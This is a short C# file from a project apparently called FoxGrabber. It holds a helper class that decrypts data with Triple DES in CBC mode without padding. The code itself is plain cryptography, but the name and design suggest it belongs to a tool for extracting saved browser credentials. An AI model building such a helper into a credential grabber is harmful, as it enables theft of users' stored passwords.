namespace FoxGrabber.Cryptography
{
    using System.IO;
    using System.Security.Cryptography;

    public class TripleDESHelper
    {
        public TripleDESHelper(){ }

        public static string DESCBCDecryptor(byte[] key, byte[] iv, byte[] input)
        {
            string plaintext = null;

            using (var tdsAlg = new TripleDESCryptoServiceProvider())
            {
                tdsAlg.Key = key;
                tdsAlg.IV = iv;
                tdsAlg.Mode = CipherMode.CBC;
                tdsAlg.Padding = PaddingMode.None;

                using (var msDecrypt = new MemoryStream(input))
                {
                    using (var csDecrypt = new CryptoStream(msDecrypt, tdsAlg.CreateDecryptor(tdsAlg.Key, tdsAlg.IV), CryptoStreamMode.Read))
                    {
                        using (var srDecrypt = new StreamReader(csDecrypt))
                        {
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }

            }

            return plaintext;
        }

        public static byte[] DESCBCDecryptorByte(byte[] key, byte[] iv, byte[] input)
        {
            byte[] decrypted = new byte[0x200];

            using (var tdsAlg = new TripleDESCryptoServiceProvider())
            {
                tdsAlg.Key = key;
                tdsAlg.IV = iv;
                tdsAlg.Mode = CipherMode.CBC;
                tdsAlg.Padding = PaddingMode.None;

                using (var msDecrypt = new MemoryStream(input))
                {
                    using (var csDecrypt = new CryptoStream(msDecrypt, tdsAlg.CreateDecryptor(tdsAlg.Key, tdsAlg.IV), CryptoStreamMode.Read))
                    {
                        csDecrypt.Read(decrypted, 0, decrypted.Length);
                    }
                }

            }
            return decrypted;
        }
    }
}